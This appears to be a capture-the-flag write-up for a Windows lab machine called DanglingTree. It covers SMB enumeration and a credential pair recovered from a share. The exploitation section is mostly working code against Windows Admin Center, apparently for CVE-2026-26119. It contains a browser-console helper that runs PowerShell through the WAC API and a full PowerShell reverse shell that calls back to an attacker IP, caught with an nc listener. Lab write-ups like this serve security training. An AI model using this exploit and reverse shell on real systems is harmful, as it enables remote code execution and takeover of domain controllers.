# Profile
- Lab: DanglingTree 
- ip: 10.129.61.100
- Category: Windows

# Enumeration
sudo nmap -sC -sV 10.129.61.100 -p- -oN dt_nmap
```
nxc smb 10.129.61.100 -u '' -p '' --users
SMB         10.129.61.100   445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:danglingtree.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.61.100   445    DC               [+] danglingtree.htb\: 
```
```
smbclient -L '\\10.129.61.100\' -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        IT              Disk      
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
```
```
└──╼ $smbclient '\\10.129.61.100\IT' -U 'guest'
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Apr  5 01:05:09 2026
  ..                                  D        0  Sun Apr  5 00:57:30 2026
  Security                            D        0  Sun Apr  5 01:05:20 2026

                7062015 blocks of size 4096. 2217767 blocks available
smb: \> ls Security\DanglingTree_RoE_Assessment.pdf 
  DanglingTree_RoE_Assessment.pdf      A    28905  Sat Apr  4 15:50:23 2026

                7062015 blocks of size 4096. 2217430 blocks available
smb: \> get Security\DanglingTree_RoE_Assessment.pdf 
getting file \Security\DanglingTree_RoE_Assessment.pdf of size 28905 as Security\DanglingTree_RoE_Assessment.pdf (16.1 KiloBytes/sec) (average 16.1 KiloBytes/sec)
```

We inspect the pdf and it is a gold bomb.
anderson.w:R3dT3am@Acc3ss#01

Looking at nmap scan of all ports, we discover the WAC(Windows Admin Control ) on port 6600 that we access using the credentials we have.

# Exploitation
Using the WAC CVE-2026-26119, we exploit it to gain a shell.
```Using the browser console
# helper code 
async function invokeWac(script) {
    const match = document.cookie.match(/(?:^|; )XSRF-TOKEN=([^;]+)/);
    if (!match) throw new Error("XSRF-TOKEN was not present");

    const response = await fetch(
        "/api/services/WinREST/PowerShell/nodes/dc/invokeCommand",
        {
            method: "POST",
            credentials: "same-origin",
            headers: {
                "Content-Type": "application/json; charset=UTF-8",
                "X-Xsrf-Token": decodeURIComponent(match[1]),
                "X-Ms-Sme-Module-Name": "msft.sme.shell",
                "X-Ms-Sme-Module-Version": "6.8.9"
            },
            body: JSON.stringify({
                properties: {
                    script,
                    command: "Get-WACSMServerConnectionStatus",
                    module: "Microsoft.SME.ServerManager",
                    state: "ready",
                    useInProcRunspace: false,
                    invokeMode: "Polling"
                }
            })
        }
    );

    const result = await response.json();
    if (!response.ok) throw new Error(JSON.stringify(result));
    return result;
}

# poc testing
const poc = await invokeWac("whoami; hostname; (Get-Location).Path");
({
    completed: poc.completed,
    results: poc.results,
    errors: poc.errors,
    statusCode: poc.statusCode
});

# triggering the reverse shell here
const callbackHost = "10.10.16.236";  // attacker ip
const callbackPort = 4444;

const reverseShell = `
$client = New-Object System.Net.Sockets.TCPClient('${callbackHost}', ${callbackPort});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535 | ForEach-Object { 0 };

while (($count = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $command = (New-Object Text.ASCIIEncoding).GetString($bytes, 0, $count);
    $output = Invoke-Expression $command 2>&1 | Out-String;
    $prompt = $output + 'PS ' + (Get-Location).Path + '> ';
    $send = [Text.Encoding]::ASCII.GetBytes($prompt);
    $stream.Write($send, 0, $send.Length);
    $stream.Flush();
}

$client.Close();
`;

await invokeWac(reverseShell);


```

You will receive a connection on your `nc -lvnp 4444` previously obviously launched.



# Links
https://www.semperis.com/blog/what-you-need-to-know-windows-admin-center-remote-privilege-escalation-cve-2026-26119/
https://wither2rebirth.com/reports/htb-DanglingTree#heading-2
